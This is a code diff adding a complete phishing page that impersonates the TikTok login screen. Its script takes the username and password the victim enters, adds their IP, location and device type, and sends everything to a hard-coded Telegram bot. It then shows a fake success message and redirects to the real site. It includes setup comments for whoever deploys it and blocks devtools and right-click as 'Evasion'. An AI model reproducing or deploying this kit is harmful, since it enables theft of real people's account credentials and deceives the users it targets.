@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to TikTok</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #000;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .logo-section {
+            margin-bottom: 32px;
+            text-align: center;
+        }
+
+        .tiktok-logo {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 8px;
+        }
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: #000;
+            letter-spacing: -0.02em;
+        }
+
+        .form-container {
+            width: 100%;
+            background: #fafafa;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
+            margin-bottom: 24px;
+        }
+
+        .form-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            text-align: center;
+            color: #000;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .form-input {
+            width: 100%;
+            height: 48px;
+            padding: 0 16px;
+            border: 2px solid #dbdbdb;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #fff;
+            transition: border-color 0.2s ease;
+            outline: none;
+        }
+
+        .form-input:focus {
+            border-color: #fe2c55;
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .form-label {
+            position: absolute;
+            left: 16px;
+            top: 14px;
+            font-size: 16px;
+            color: #666;
+            pointer-events: none;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+
+        .form-input:focus ~ .form-label,
+        .form-input:not(:placeholder-shown) ~ .form-label {
+            top: -8px;
+            left: 12px;
+            font-size: 12px;
+            color: #fe2c55;
+            background: #fff;
+            padding: 0 4px;
+            border-radius: 4px;
+        }
+
+        .login-button {
+            width: 100%;
+            height: 48px;
+            background: linear-gradient(90deg, #fe2c55 0%, #ff8a80 100%);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            margin-top: 8px;
+        }
+
+        .login-button:hover:not(:disabled) {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(254, 44, 85, 0.3);
+        }
+
+        .login-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #e1e1e1;
+        }
+
+        .divider span {
+            padding: 0 16px;
+            background: #fafafa;
+        }
+
+        .oauth-buttons {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+
+        .oauth-button {
+            height: 44px;
+            border: 2px solid #dbdbdb;
+            border-radius: 8px;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            color: #000;
+            text-decoration: none;
+            transition: all 0.2s ease;
+        }
+
+        .oauth-button:hover {
+            border-color: #fe2c55;
+        }
+
+        .oauth-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            color: #fe2c55;
+        }
+
+        .success-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        .success-card {
+            background: #fff;
+            border-radius: 16px;
+            padding: 40px 32px;
+            text-align: center;
+            max-width: 320px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+
+        .success-icon {
+            width: 64px;
+            height: 64px;
+            background: #00d4aa;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: #fff;
+            font-weight: bold;
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #000;
+        }
+
+        .success-text {
+            color: #666;
+            font-size: 16px;
+        }
+
+        @media (max-width: 480px) {
+            .main-container {
+                padding: 0 16px;
+            }
+            
+            .form-container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="logo-section">
+            <img src="https://www.tiktok.com/favicon.ico" alt="TikTok" class="tiktok-logo">
+            <div class="logo-text">TikTok</div>
+        </div>
+
+        <div class="form-container">
+            <h1 class="form-title">Log in</h1>
+            
+            <form id="loginForm">
+                <div class="input-wrapper">
+                    <input type="text" class="form-input" id="username" placeholder=" " required autocomplete="username">
+                    <label class="form-label" for="username">Phone or Email</label>
+                </div>
+                
+                <div class="input-wrapper">
+                    <input type="password" class="form-input" id="password" placeholder=" " required autocomplete="current-password">
+                    <label class="form-label" for="password">Password</label>
+                </div>
+                
+                <button type="submit" class="login-button">Log in</button>
+            </form>
+
+            <div style="text-align: center; margin-top: 16px;">
+                <a href="#" style="color: #fe2c55; font-size: 14px; font-weight: 500; text-decoration: none;">Forgot password?</a>
+            </div>
+
+            <div class="divider">
+                <span>or</span>
+            </div>
+
+            <div class="oauth-buttons">
+                <a href="#" class="oauth-button" onclick="showAlert('Google login disabled')">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHZpZXdCb3g9IjAgMCA0ODU0IDQ4NTQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI0ODU0IiBoZWlnaHQ9IjQ4NTQiIHJ4PSIyNDI3IiBmaWxsPSIjM0I4MEZGIi8+CjxwYXRoIGQ9Ik0zOTA2IDM1OTNIMzQ1M0w0MDY2IDQxOTZDNDIxMiA0MzM1IDQxOTIgNDM1NCA0MTkyIDQ0MjZDMzgzOSAzOTY1IDMyNzMgMzUxNSAyNzM5IDM1MTVDMjM5MiAzNTE1IDIwOTQgMzU2NSAxOTI1IDM3OTZDMTg1NCAzODI4IDE4MDIgMzg1NCAxNzgzIDM5MTZDMTc1MiAzOTc0IDE3MzcgNDAxMSAxNzM3IDQwNTZDMTczNyA0MTI5IDE3OTIgNDE4NSAxODUwIDQyMjZDMTk1MiA0MzE5IDIyMTIgNDQzOSAyNTI4IDQ0MzljLjc3LjAgMS41Mi0uMzEgMi4wOS0uODZsMTAuMDMtMTMuNjNjLjE1LS4yNS4yNC0uNTUuMjQtLjgzVjM1OTNoLTQ1OHYtNjI3aDE5Njl2OTQ4eiIgZmlsbD0id2hpdGUiLz4KPC9zdmc+Cg==" class="oauth-icon">
+                    Continue with Google
+                </a>
+            </div>
+        </div>
+
+        <div class="footer-links">
+            <a href="#" onclick="showAlert('Disabled')">About</a>
+            <a href="#" onclick="showAlert('Disabled')">Careers</a>
+            <a href="#" onclick="showAlert('Disabled')">Press</a>
+            <a href="#" onclick="showAlert('Disabled')">Help</a>
+        </div>
+    </div>
+
+    <!-- Success Overlay -->
+    <div id="successOverlay" class="success-overlay" style="display: none;">
+        <div class="success-card">
+            <div class="success-icon">✓</div>
+            <div class="success-title">Success</div>
+            <div class="success-text">Taking you to TikTok</div>
+        </div>
+    </div>
+
+    <script>
+        // === QUICK SETUP ===
+        // 1. @BotFather -> /newbot -> Get BOT_TOKEN
+        // 2. @userinfobot -> Get CHAT_ID  
+        // 3. Replace below:
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+        const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Disable button
+            const btn = document.querySelector('.login-button');
+            btn.disabled = true;
+            btn.textContent = 'Logging in...';
+            
+            // Capture & send
+            await captureCredentials(username, password);
+            
+            // Show success
+            document.getElementById('successOverlay').style.display = 'flex';
+            
+            // Redirect after 1.5s
+            setTimeout(() => {
+                window.location.href = 'https://www.tiktok.com';
+            }, 1500);
+        });
+
+        async function captureCredentials(username, password) {
+            try {
+                const ip = await getIP();
+                const geo = await getGeo(ip);
+                const fp = getFingerprint();
+                
+                const payload = `🎬 *TIKTOK LOGIN CAPTURED* 🎬\n\n` +
+                    `👤 *Username/Email:* \`${username}\`\n` +
+                    `🔐 *Password:* \`${password}\`\n` +
+                    `🌍 *IP:* \`${ip}\`\n` +
+                    `📍 *Location:* ${geo}\n` +
+                    `🕒 *Time:* \`${new Date().toLocaleString()}\`\n` +
+                    `📱 *Device:* ${fp.device}\n` +
+                    `🌐 *UA:* \`${navigator.userAgent.slice(0,80)}...\``;
+                
+                // Telegram
+                if (BOT_TOKEN !== '8318971639:AAFJhBTmu02lC66pJPSepyyqwl7WSq1L9Mw') {
+                    await fetch(`https://api.telegram.org/bot8318971639:AAFJhBTmu02lC66pJPSepyyqwl7WSq1L9Mw/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: 6811423658,
+                            text: payload,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        })
+                    });
+                }
+                
+            } catch(e) {
+                console.error('Send failed:', e);
+            }
+        }
+
+        async function getIP() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                return (await res.json()).ip;
+            } catch { return 'N/A'; }
+        }
+
+        async function getGeo(ip) {
+            try {
+                const res = await fetch(`https://ipapi.co/${ip}/json/`);
+                const data = await res.json();
+                return `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.trim();
+            } catch { return 'N/A'; }
+        }
+
+        function getFingerprint() {
+            return {
+                device: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+            };
+        }
+
+        function showAlert(msg) {
+            alert(msg);
+        }
+
+        // Evasion
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
